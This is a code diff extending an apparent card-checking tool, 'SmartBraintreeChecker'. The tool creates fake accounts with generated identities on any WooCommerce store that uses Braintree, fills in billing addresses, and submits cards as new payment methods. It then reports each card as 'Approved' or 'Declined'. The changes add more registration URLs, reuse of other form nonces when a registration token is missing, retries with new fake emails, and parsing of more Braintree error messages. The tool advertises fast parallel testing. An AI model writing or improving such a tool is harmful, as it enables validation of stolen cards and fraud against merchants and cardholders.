@@ -56,6 +56,20 @@ URL_PATTERNS = [
         'address_url': '/account/edit-address/billing/',
         'payment_url': '/account/add-payment-method/',
         'payment_method': 'braintree_credit_card'
+    },
+    {
+        'name': 'WooCommerce Register',
+        'register_url': '/wp-login.php?action=register',
+        'address_url': '/my-account/edit-address/billing/',
+        'payment_url': '/my-account/add-payment-method/',
+        'payment_method': 'braintree_credit_card'
+    },
+    {
+        'name': 'Checkout Register',
+        'register_url': '/checkout/',
+        'address_url': '/my-account/edit-address/billing/',
+        'payment_url': '/my-account/add-payment-method/',
+        'payment_method': 'braintree_credit_card'
     }
 ]
 
@@ -265,7 +279,10 @@ class SmartBraintreeChecker:
                 f"{self.base_url}{self.detected_config['register_url']}",
                 f"{self.base_url}/my-account/",
                 f"{self.base_url}/customer-account/?action=register",
-                f"{self.base_url}/account/register/"
+                f"{self.base_url}/account/register/",
+                f"{self.base_url}/wp-login.php?action=register",
+                f"{self.base_url}/checkout/",
+                f"{self.base_url}/register/"
             ]
             
             html = None
@@ -275,7 +292,9 @@ class SmartBraintreeChecker:
             for reg_url in reg_urls:
                 try:
                     success, test_html = await self.get_page(reg_url)
-                    if success and 'woocommerce-register-nonce' in test_html:
+                    if success and ('woocommerce-register-nonce' in test_html or 
+                                  'wp-login.php?action=register' in reg_url or
+                                  'checkout' in reg_url):
                         html = test_html
                         working_reg_url = reg_url
                         logger.info(f"Found registration form at: {reg_url}")
@@ -287,6 +306,13 @@ class SmartBraintreeChecker:
                 return False, "No registration form found"
             
             tokens = self.extract_tokens(html)
+            if not tokens.get('register_nonce'):
+                # Try to find other registration tokens
+                if 'woocommerce-login-nonce' in html:
+                    tokens['register_nonce'] = tokens['login_nonce']
+                elif 'woocommerce-edit-address-nonce' in html:
+                    tokens['register_nonce'] = tokens['edit_address_nonce']
+            
             if not tokens.get('register_nonce'):
                 return False, "No registration token found"
             
@@ -313,7 +339,19 @@ class SmartBraintreeChecker:
                 form_data['password'] = user_data['password']
             
             if 'name="email_2"' in html:
-                form_data['email_2'] = ''
+                form_data['email_2'] = user_data['email']
+            
+            if 'name="first_name"' in html:
+                form_data['first_name'] = user_data['first_name']
+            
+            if 'name="last_name"' in html:
+                form_data['last_name'] = user_data['last_name']
+            
+            if 'name="billing_first_name"' in html:
+                form_data['billing_first_name'] = user_data['first_name']
+            
+            if 'name="billing_last_name"' in html:
+                form_data['billing_last_name'] = user_data['last_name']
             
             # Add WooCommerce attribution
             form_data.update({
@@ -333,7 +371,9 @@ class SmartBraintreeChecker:
                 final_url = str(response.url)
                 
                 # Check multiple success indicators
-                if any(x in result for x in ['Log out', 'logout', 'Dashboard', 'My Account', 'my-account/edit-address']):
+                success_indicators = ['Log out', 'logout', 'Dashboard', 'My Account', 'my-account/edit-address', 
+                                   'account-created', 'registration-completed']
+                if any(x in result for x in success_indicators):
                     if 'login' not in final_url.lower() or 'my-account' in final_url.lower():
                         logger.info("Registration successful")
                         return True, user_data
@@ -342,6 +382,12 @@ class SmartBraintreeChecker:
                 if 'already registered' in result.lower() or 'already exists' in result.lower():
                     logger.info("Account exists, trying different email")
                     # Generate new email and retry once
+                    user_data['email'] = f"{fake.first_name().lower()}{random.randint(1000,9999)}@gmail.com"
+                    return await self.register_account(user_data)
+                
+                # Check for specific error messages
+                if 'invalid email' in result.lower() or 'email is invalid' in result.lower():
+                    logger.info("Invalid email format, trying different email")
                     user_data['email'] = f"{fake.first_name().lower()}{random.randint(1000,9999)}@gmail.com"
                     return await self.register_account(user_data)
                 
@@ -359,9 +405,29 @@ class SmartBraintreeChecker:
             edit_url = f"{self.base_url}{self.detected_config['address_url']}"
             success, html = await self.get_page(edit_url)
             if not success:
-                return False, "Address page not accessible"
+                # Try alternative address URLs
+                alt_urls = [
+                    f"{self.base_url}/my-account/edit-address/",
+                    f"{self.base_url}/customer-account/edit-address/",
+                    f"{self.base_url}/account/edit-address/"
+                ]
+                for alt_url in alt_urls:
+                    success, html = await self.get_page(alt_url)
+                    if success:
+                        edit_url = alt_url
+                        break
+                
+                if not success:
+                    return False, "Address page not accessible"
             
             tokens = self.extract_tokens(html)
+            if not tokens.get('edit_address_nonce'):
+                # Try to find other address tokens
+                if 'woocommerce-login-nonce' in html:
+                    tokens['edit_address_nonce'] = tokens['login_nonce']
+                elif 'woocommerce-register-nonce' in html:
+                    tokens['edit_address_nonce'] = tokens['register_nonce']
+            
             if not tokens.get('edit_address_nonce'):
                 return False, "No address token"
             
@@ -393,7 +459,7 @@ class SmartBraintreeChecker:
             
             async with self.session.post(edit_url, headers=headers, data=data_str) as response:
                 result = await response.text()
-                if "successfully" in result.lower() or "changed" in result.lower():
+                if "successfully" in result.lower() or "changed" in result.lower() or "updated" in result.lower():
                     logger.info("Address updated")
                     return True, "Success"
                 return False, "Failed"
@@ -423,6 +489,14 @@ class SmartBraintreeChecker:
             # Check text content
             if 'payment method was successfully added' in result.lower():
                 return "Approved: Payment method added"
+            
+            # Check for specific Braintree errors
+            if 'credit card type is not accepted' in result.lower():
+                return "Declined: Credit card type not accepted"
+            if 'verifications are not supported' in result.lower():
+                return "Declined: Verifications not supported"
+            if 'addresses must have at least one field filled in' in result.lower():
+                return "Declined: Address validation failed"
             
             return "Unknown Response"
         except:
@@ -724,6 +798,7 @@ def home():
                 <li>✅ Auto-detects payment method (braintree_credit_card or braintree_cc)</li>
                 <li>✅ Works on ANY WooCommerce Braintree site</li>
                 <li>✅ Fast parallel testing</li>
+                <li>✅ Improved registration logic</li>
             </ul>
             
             <h2 style="color: #3498db;">Response:</h2>
@@ -781,6 +856,7 @@ if __name__ == "__main__":
 ✅ Automatically tries /account/ URLs
 ✅ Automatically detects payment method type
 ✅ Works on ANY WooCommerce Braintree site!
+✅ Improved registration logic
 
 ENDPOINTS:
 ──────────
